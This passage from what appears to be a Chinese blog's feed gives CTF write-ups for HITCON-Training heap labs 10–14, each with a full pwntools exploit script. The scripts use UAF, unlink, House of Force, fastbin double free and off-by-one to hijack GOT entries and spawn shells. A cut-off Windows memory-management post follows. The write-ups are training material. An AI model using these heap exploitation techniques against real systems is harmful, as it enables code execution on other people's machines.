    <content type="html"><![CDATA[<p>HITCON-Training</p><a id="more"></a><h1 id="HITCON-Training"><a href="#HITCON-Training" class="headerlink" title="HITCON-Training"></a>HITCON-Training</h1><h2 id="lab10"><a href="#lab10" class="headerlink" title="lab10"></a>lab10</h2><p><img src="image-20200906224803905.png" alt="image-20200906224803905"></p><p>典型的菜单</p><p>delete后没有置零存在UAF</p><p>目的很明显</p><p><img src="image-20200906225039587.png" alt="image-20200906225039587"></p><p>print这边会有个调用，吧原来puts函数hook即可</p><p><img src="image-20200906225107873.png" alt="image-20200906225107873"></p><p>可以发现程序右后门</p><p>根据first fit</p><p>分配俩个大小大于8的堆，free后再分配个大小为8即可拿到原来堆块notelist那块</p><p>然后因为没有置0，再次调用print即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a = process(<span class="hljs-string">&quot;hacknote&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(size))<br>a.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>a.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printffunc</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;3&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(index))<br><br>pay = p32(<span class="hljs-number">0x8048986</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>,pay)<br>printffunc(<span class="hljs-number">0</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><h2 id="lab11"><a href="#lab11" class="headerlink" title="lab11"></a>lab11</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>俩种打法，这边是第一种unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a = process(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>)<br>a.sendline(<span class="hljs-built_in">str</span>(size))<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the name of item:&quot;</span>)<br>a.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>)<br>a.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index,size,content</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>)<br>a.sendline(<span class="hljs-built_in">str</span>(index))<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>)<br>a.sendline(<span class="hljs-built_in">str</span>(size))<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the new name of the item:&quot;</span>)<br>a.sendline(content)<br><br><span class="hljs-comment">#gdb.attach(a,&#x27;b *0x400E42&#x27;)</span><br>chunk = <span class="hljs-number">0x6020C8</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;111&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;222&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;333&#x27;</span>)<br>pay = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x80</span>+<span class="hljs-number">1</span>) + p64(chunk-<span class="hljs-number">0x18</span>) + p64(chunk - <span class="hljs-number">0x10</span>)<br>pay += <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>-<span class="hljs-number">0x20</span>)<br>pay += p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pay),pay)<br>delete(<span class="hljs-number">1</span>)<br>pay = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x80</span>) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pay),pay)<br>show(<span class="hljs-number">0</span>)<br>a.recvuntil(<span class="hljs-string">&quot;0 : &quot;</span>)<br>atoi = u64(a.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>base = atoi - libc.symbols[<span class="hljs-string">&quot;atoi&quot;</span>]<br>system = base + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><p><img src="image-20200907205654758.png" alt="image-20200907205654758"></p><p>delete的时候置零了不存再uaf</p><p><img src="image-20200907205726268.png" alt="image-20200907205726268"></p><p>change没有检测大小，存在堆溢出</p><p>所以可以用unlink分配任意地址，修改地址处为某函数got表后leak计算system地址修改后get shell</p><h3 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h3><p>还有一种打法就是House Of Force，目的和unlink一样就是任意地址写，判断用哪种方法主要取决于pie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a = process(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(size))<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the name of item:&quot;</span>)<br>a.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;4&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index,size,content</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;3&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(index))<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>)<br>a.send(<span class="hljs-built_in">str</span>(size))<br>a.recvuntil(<span class="hljs-string">&quot;Please enter the new name of the item:&quot;</span>)<br>a.send(content)<br><br><span class="hljs-comment">#gdb.attach(a,&#x27;b *0x400d49&#x27;)</span><br>magic = <span class="hljs-number">0x400d49</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>,pay)<br>add(-<span class="hljs-number">128</span>,<span class="hljs-string">&#x27;abc&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.send(<span class="hljs-string">&#x27;5&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>具体利用方法就是修改top chunk大小为-1然后计算偏移覆盖一开始malloc得堆块函数指针为magic即可</p><h2 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a = process(<span class="hljs-string">&quot;./secretgarden&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./secretgarden&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content,color</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Length of the name :&quot;</span>)<br>a.sendline(<span class="hljs-built_in">str</span>(size))<br>a.recvuntil(<span class="hljs-string">&quot;The name of flower :&quot;</span>)<br>a.send(content)<br>a.recvuntil(<span class="hljs-string">&quot;The color of the flower :&quot;</span>)<br>a.sendline(color)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Which flower do you want to remove from the garden:&quot;</span>)<br>a.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clean</span>():</span><br>a.recvuntil(<span class="hljs-string">&quot;Your choice : &quot;</span>)<br>a.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>gdb.attach(a,<span class="hljs-string">&#x27;b *0x400C7B&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0x601ffa</span>),<span class="hljs-string">&#x27;123&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x400C7B</span>)*<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>Fastbin Double Free</p><p><img src="image-20200910153738019.png" alt="image-20200910153738019"></p><p><img src="image-20200910153918730.png" alt="image-20200910153918730"></p><p>大致结构如上</p><p>主要漏洞函数再del那</p><p><img src="image-20200910153943896.png" alt="image-20200910153943896"></p><p>可以double free，直接覆盖got表即可</p><h2 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span>(<span class="hljs-params">size,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#gdb.attach(r,&#x27;b *0x400D7B&#x27;)</span><br>free_got = <span class="hljs-number">0x602018</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) +<span class="hljs-string">&#x27;\x41&#x27;</span><br>edit(<span class="hljs-number">0</span>,pay)<br>delete(<span class="hljs-number">1</span>)<br>pay = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0x30</span>) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br>create(<span class="hljs-number">0x30</span>,pay)<br>show(<span class="hljs-number">1</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>func = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(func)<br>base = func - libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system = base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;sh&quot;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="image-20200911004553484.png" alt="image-20200911004553484"></p><p>heap off by one</p><p>正好可以覆盖下一个堆块的size域，修改大小为0x41，下一次就能覆盖heaparray中的值为got，leak后再次覆盖就可以劫持got表</p><p><img src="image-20200911172152145.png" alt="image-20200911172152145"></p><p>这时候直接输入sh就能拿到shell</p><h2 id="lab14"><a href="#lab14" class="headerlink" title="lab14"></a>lab14</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_heap</span>(<span class="hljs-params">size,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_heap</span>(<span class="hljs-params">idx,size,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_heap</span>(<span class="hljs-params">idx</span>):</span><br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>chunk = <span class="hljs-number">0x6020E0</span><br>create_heap(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>create_heap(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br>create_heap(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<br>pay = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x80</span>+<span class="hljs-number">1</span>) + p64(chunk-<span class="hljs-number">0x18</span>) + p64(chunk - <span class="hljs-number">0x10</span>)<br>pay += <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>-<span class="hljs-number">0x20</span>)<br>pay += p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit_heap(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pay),pay)<br>del_heap(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r,&#x27;b *0x400C8C&#x27;)</span><br>edit_heap(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x6020c0</span>))<br>edit_heap(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0x1306</span>))<br>r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;4869&quot;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>还是unlink</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows内存管理</title>
    <link href="/2020/08/28/Windows%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2020/08/28/Windows%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>简述windows内存管理</p><a id="more"></a><h1 id="windows进程空间划分"><a href="#windows进程空间划分" class="headerlink" title="windows进程空间划分"></a>windows进程空间划分</h1><table><thead><tr><th>分区</th><th>x86 32位Windows</th></tr></thead><tbody><tr><td>空指针赋值区</td><td>0x00000000 - 0x0000FFFF</td></tr><tr><td>用户模式区</td><td>0x00010000 - 0x7FFEFFFF</td></tr><tr><td>64KB禁入区</td><td>0x7FFF0000 - 0x7FFFFFFF</td></tr><tr><td>内核</td><td>0x80000000 - 0xFFFFFFFF</td></tr></tbody></table><p>首先有个问题，我们都知道用户态空间中存放着用户私有数据代码还有dll，那每当我们需要分配空间时，例如调用virtualalloc函数，操作系统是如何找到一块未被使用的内存呢？</p><p>所以说每个进程中都存在一个结构体记录了用户态地址分配情况(内核态基本相同)</p><h2 id="VAD"><a href="#VAD" class="headerlink" title="VAD"></a>VAD</h2><p>VAD组织成一个AVL自平衡二叉树。</p><p>位于eprocess处</p><p><img src="image-20200827214645231.png" alt="image-20200827214645231"></p><p><img src="image-20200827215302271.png" alt="image-20200827215302271"></p><p>查看一波结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">nt!_MMVAD<br>   +<span class="hljs-number">0x000</span> StartingVpn  <span class="hljs-comment">//线性地址开始位置(页为单位)</span><br>   +<span class="hljs-number">0x004</span> EndingVpn<span 